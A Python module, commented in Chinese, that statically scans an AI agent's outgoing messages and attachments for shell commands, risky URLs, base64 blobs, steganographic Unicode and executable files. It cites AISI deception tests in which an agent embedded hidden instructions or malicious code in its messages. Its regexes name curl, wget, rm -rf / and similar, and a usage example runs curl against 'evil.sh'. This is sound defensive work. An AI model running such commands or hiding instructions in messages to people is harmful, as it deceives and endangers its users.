"""OutboundPayloadSanitizer — 出站载荷消毒 (v0.52.1 G3-A3)。

对位 AISI 欺骗测试发现 ③（提示注入：植入隐藏指令）与发现 ② 中的恶意载荷：
代理向人类发送含恶意代码/危险链接/隐写指令的消息。

检测能力:
- 可执行载荷: shell/bash/zsh/powershell/cmd/python 命令片段
- 危险 URL: 短链、非 https、IP 直连主机、重定向参数
- base64 载荷: 长 base64 文本块 (可能是编码后的可执行内容)
- 隐写指令: 复用 ``maref.security.steg_sanitizer.UnicodeAnomalyDetector``
- 附件风险: 可执行扩展名、压缩包 + 宏/可执行文件组合

设计:
- 纯函数式规则, 可独立单测; 不引入网络请求 (仅静态检测)
- 输出 ``PayloadFlag`` 枚举 + ``PayloadSanitizeResult`` (含证据)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from urllib.parse import urlparse

from maref.security.outbound.message import OutboundAttachment
from maref.security.steg_sanitizer import KNOWN_STEGO_CODEPOINTS, UnicodeAnomaly


class PayloadFlag(str, Enum):
    """载荷风险标记枚举。"""

    EXECUTABLE = "executable"  # 可执行代码片段
    DANGEROUS_URL = "dangerous_url"  # 危险 URL (短链/非https/IP直连)
    BASE64_BLOB = "base64_blob"  # 长 base64 文本块
    STEGO_UNICODE = "stego_unicode"  # 隐写/异常 Unicode
    ATTACHMENT_EXECUTABLE = "attachment_executable"  # 附件可执行文件
    ATTACHMENT_ARCHIVE_MACRO = "attachment_archive_macro"  # 压缩包+可执行组合
    NONE = "none"


# 危险 URL 短链域名 (lowercase)
_DANGEROUS_SHORTENERS: tuple[str, ...] = (    "bit.ly",
    "t.co",
    "tinyurl.com",
    "rebrand.ly",
    "goo.gl",
    "is.gd",
    "buff.ly",
    "ow.ly",
)

# 可执行/脚本文件扩展名 (附件检测)
_EXECUTABLE_EXTENSIONS: tuple[str, ...] = (
    ".exe",
    ".msi",
    ".bat",
    ".cmd",
    ".ps1",
    ".sh",
    ".bash",
    ".zsh",
    ".vbs",
    ".js",
    ".jse",
    ".wsf",
    ".hta",
    ".scr",
    ".pif",
    ".jar",
    ".py",
    ".pyc",
    ".com",
)

# 压缩包扩展名
_ARCHIVE_EXTENSIONS: tuple[str, ...] = (
    ".zip",
    ".tar",
    ".gz",
    ".tgz",
    ".rar",
    ".7z",
    ".bz2",
    ".xz",
)

# 可执行代码片段特征正则
_EXEC_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\b(bash|sh|zsh|powershell|pwsh|cmd)\s+-[ce]", re.IGNORECASE),
    re.compile(r"\bsudo\s+(rm|mv|chmod|chown|install|curl|wget)", re.IGNORECASE),
    re.compile(r"\bcurl\s+-[a-zA-Z]*[oO]\s+\S+", re.IGNORECASE),
    re.compile(r"\bwget\s+\S+", re.IGNORECASE),
    re.compile(r"\brm\s+-rf\s+/", re.IGNORECASE),
    re.compile(r"\beval\s*\(", re.IGNORECASE),
    re.compile(r"\bexec\s*\(", re.IGNORECASE),
    re.compile(r"__import__\s*\(\s*['\"]os['\"]\s*\)", re.IGNORECASE),
    re.compile(r"\bsystem\s*\(.*['\"]", re.IGNORECASE),
    re.compile(r"\bsubprocess\s*\.\s*(run|call|Popen)\s*\(", re.IGNORECASE),
    re.compile(r"invoke-?\s?(webrequest|expression|command)", re.IGNORECASE),
)

# base64 长块检测: ≥40 个连续 base64 字符 (含 url-safe 字符集 -_)
_BASE64_BLOB_RE = re.compile(r"[A-Za-z0-9+/_-]{40,}={0,2}")

# 危险 URL scheme
_DANGEROUS_SCHEMES: tuple[str, ...] = ("javascript:", "data:text/html", "file://", "vbscript:")


@dataclass
class PayloadSanitizeResult:
    """载荷检测结果。

    Attributes:
        flags: 命中的风险标记列表。
        blocked: 是否建议阻断 (命中任何标记)。
        urls: 文本中提取到的 URL 列表。
        anomalies: 检测到的 Unicode 异常 (隐写指令)。
        reason: 综合理由 (审计用)。
        detail: 结构化证据。
    """

    flags: list[PayloadFlag] = field(default_factory=list)
    blocked: bool = False
    urls: list[str] = field(default_factory=list)
    anomalies: list[UnicodeAnomaly] = field(default_factory=list)
    reason: str = ""
    detail: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "flags": [f.value for f in self.flags],
            "blocked": self.blocked,
            "urls": self.urls,
            "anomaly_count": len(self.anomalies),
            "reason": self.reason,
            "detail": self.detail,
        }


# URL 提取正则: IGNORECASE 防大写 scheme 绕过 (G3-C2 修复)
_URL_RE = re.compile(r"https?://[^\s<>\"']+|(?:www\.)[^\s<>\"']+", re.IGNORECASE)

# 裸 IP 路径 (无 scheme): 1.2.3.4/payload.sh 等 (G3-C2 修复)
_BARE_IP_URL_RE = re.compile(
    r"(?<!\w)\b\d{1,3}(?:\.\d{1,3}){3}(?:[/:][^\s<>\"']*)?"
)


class OutboundPayloadSanitizer:
    """出站载荷消毒器 (纯静态检测)。

    Usage::

        sanitizer = OutboundPayloadSanitizer()
        result = sanitizer.sanitize(body="请运行 bash -c 'curl evil.sh'",
                                    attachments=[...])
        if result.blocked:
            raise BlockedPayloadError(...)
    """

    def __init__(self) -> None:
        self._stego_codepoints: frozenset[int] = KNOWN_STEGO_CODEPOINTS

    def _detect_stego(self, text: str) -> list[UnicodeAnomaly]:
        """检测文本中的已知隐写码点 (零宽字符/BOM/修饰符撇号/方向控制)。

        不使用 ``UnicodeAnomalyDetector`` 的全类别扫描 (其允许类别仅覆盖
        Latin 文本, 会误报中文/其他 CJK 内容), 仅精确匹配已知隐写码点。
        """
        anomalies: list[UnicodeAnomaly] = []
        for position, ch in enumerate(text):
            cp = ord(ch)
            if cp in self._stego_codepoints:
                anomalies.append(
                    UnicodeAnomaly(
                        codepoint=cp,
                        name=f"U+{cp:04X}",
                        category="Cf",
                        position=position,
                        is_known_stego=True,
                    )
                )
        return anomalies

    def sanitize(
        self,
        body: str = "",
        attachments: list[OutboundAttachment] | None = None,
    ) -> PayloadSanitizeResult:
        """对消息正文与附件执行载荷检测。

        Args:
            body: 消息正文。
            attachments: 附件列表 (可选)。

        Returns:
            PayloadSanitizeResult, ``blocked=True`` 表示建议阻断。
        """
        flags: list[PayloadFlag] = []
        detail: dict[str, Any] = {}
        urls = self._extract_urls(body)
        detail["url_count"] = len(urls)

        # 1. 可执行代码片段
        if body and any(p.search(body) for p in _EXEC_PATTERNS):
            flags.append(PayloadFlag.EXECUTABLE)

        # 2. 危险 URL
        dangerous_urls = self._classify_urls(urls)
        if dangerous_urls:
            flags.append(PayloadFlag.DANGEROUS_URL)
            detail["dangerous_urls"] = dangerous_urls

        # 3. base64 长块
        if body and _BASE64_BLOB_RE.search(body):
            flags.append(PayloadFlag.BASE64_BLOB)

        # 4. 隐写/异常 Unicode
        if body:
            anomalies = self._detect_stego(body)
            if anomalies:
                flags.append(PayloadFlag.STEGO_UNICODE)
                detail["stego_anomaly_count"] = len(anomalies)
        else:
            anomalies = []

        # 5. 附件风险
        att_risk = self._classify_attachments(attachments or [])
        detail["attachment_flags"] = [f.value for f in att_risk]
        flags.extend(att_risk)

        blocked = len(flags) > 0
        reason = ""
        if blocked:
            reason = "出站载荷命中风险标记: " + ", ".join(f.value for f in flags)

        return PayloadSanitizeResult(
            flags=flags,
            blocked=blocked,
            urls=urls,
            anomalies=anomalies,
            reason=reason,
            detail=detail,
        )

    def _extract_urls(self, text: str) -> list[str]:
        if not text:
            return []
        urls = [m.group(0) for m in _URL_RE.finditer(text)]
        # 裸 IP 直连 (无 scheme) — G3-C2 修复
        urls.extend(m.group(0) for m in _BARE_IP_URL_RE.finditer(text))
        # 去重保序
        seen: set[str] = set()
        dedup: list[str] = []
        for u in urls:
            if u not in seen:
                seen.add(u)
                dedup.append(u)
        return dedup

    def _classify_urls(self, urls: list[str]) -> list[str]:
        dangerous: list[str] = []
        for url in urls:
            try:
                # 无 scheme 的 URL (裸 IP / www. 域名) 归一化为 https 再解析,
                # 使 www. 合法域名不因 scheme="" 被误判危险 (I3 修复),
                # 而裸 IP 直连仍会因 host 是 IP 被判危险。
                parsed = urlparse(url if "://" in url else f"https://{url}")
            except Exception:
                dangerous.append(url)
                continue
            host = (parsed.hostname or "").lower()
            scheme = parsed.scheme.lower()
            if scheme in _DANGEROUS_SCHEMES:
                dangerous.append(url)
                continue
            if host in _DANGEROUS_SHORTENERS:
                dangerous.append(url)
                continue
            if scheme != "https":
                dangerous.append(url)
                continue
            if host and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
                dangerous.append(url)  # IP 直连
                continue
        return dangerous

    def _classify_attachments(
        self, attachments: list[OutboundAttachment]
    ) -> list[PayloadFlag]:
        flags: list[PayloadFlag] = []
        exec_in_archive = False
        for att in attachments:
            name = (att.filename or "").lower()
            ext = ""
            if "." in name:
                ext = "." + name.rsplit(".", 1)[1]
            if ext in _EXECUTABLE_EXTENSIONS:
                flags.append(PayloadFlag.ATTACHMENT_EXECUTABLE)
                if att.is_archive or any(
                    name.endswith(a) for a in _ARCHIVE_EXTENSIONS
                ):
                    exec_in_archive = True
            if ext in _ARCHIVE_EXTENSIONS:
                # 压缩包 + 内部含可执行文件名 → 组合风险
                inner = (att.content or b"").decode("latin-1", errors="ignore")
                if any(
                    inner.lower().endswith(e) or f" {e.strip('.')} " in f" {inner.lower()} "
                    for e in _EXECUTABLE_EXTENSIONS
                ):
                    flags.append(PayloadFlag.ATTACHMENT_ARCHIVE_MACRO)
            # 压缩包内检测宏/可执行内容 (content 头部分析)
            if ext in _ARCHIVE_EXTENSIONS and exec_in_archive:
                flags.append(PayloadFlag.ATTACHMENT_ARCHIVE_MACRO)
        return list(dict.fromkeys(flags))  # 去重保持顺序
